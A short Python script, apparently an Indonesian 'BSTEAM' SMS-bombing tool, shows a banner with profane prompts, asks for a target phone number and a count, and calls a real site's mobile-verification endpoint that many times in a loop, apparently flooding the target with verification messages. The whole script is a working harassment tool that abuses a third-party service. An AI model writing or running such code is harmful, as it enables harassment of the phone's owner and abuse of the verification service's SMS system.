import requests, json, os, time

def logo ():
  print("""
===============\033[1;41mBSTEAM\033[1;0m================
\033[1;31m ____ ____ _____                    
| __ ) ___|_   _|__  __ _ _ __ ___  
|  _ \___ \ | |/ _ \/ _` | '_ ` _ \ 
\033[37;1m| |_) |__) || |  __/ (_| | | | | | |
|____/____/ |_|\___|\__,_|_| |_| |_|
        
===============\033[1;41mBSTEAM\033[1;0m================
""")

os.system('clear')
print("\033[1;41mTUNGGU TELASO, LAGI PROSES I ANJING!!!\033[1;0m")
time.sleep(5)
os.system('clear')
logo()
print("\033[33;1mDisarankan Spam Hanya 30 Menit 1 Sekali")
print("Klo Di Kasih Ko Tools, Janganko Teralu Brutal Sundala...")
print("Nomer Target Di Awali (8xxx)")
no = input("Nomor Target : 0")
jum = int(input("Jumlah : "))
for i in range(jum):
    req = requests.get(f"https://id.jagreward.com/member/verify-mobile/{no}")
    print("\nKeterangan :"+req.json()["message"])